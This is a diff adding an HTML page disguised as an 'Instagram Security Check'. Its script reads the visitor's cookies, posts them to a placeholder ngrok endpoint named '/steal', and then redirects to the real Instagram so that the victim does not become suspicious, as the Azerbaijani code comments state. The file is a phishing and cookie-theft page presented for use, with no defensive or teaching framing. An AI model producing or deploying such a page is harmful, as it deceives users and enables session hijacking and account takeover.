@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Security Check</title>
+    <script>
+        // 1. Cookie-ləri oğurla və serverə göndər
+        const stolenCookies = document.cookie;
+        fetch('https://YOUR_NGROK_URL.ngrok.io/steal', {
+            method: 'POST',
+            body: stolenCookies,
+            mode: 'no-cors'
+        });
+
+        // 2. Qurbanı real Instagram-a yönləndir (şübhə doğurmasın)
+        setTimeout(() => {
+            window.location.href = "https://instagram.com";
+        }, 1000);
+    </script>
+</head>
+<body>
+    <h1>Checking your account security...</h1>
+</body>
+</html>
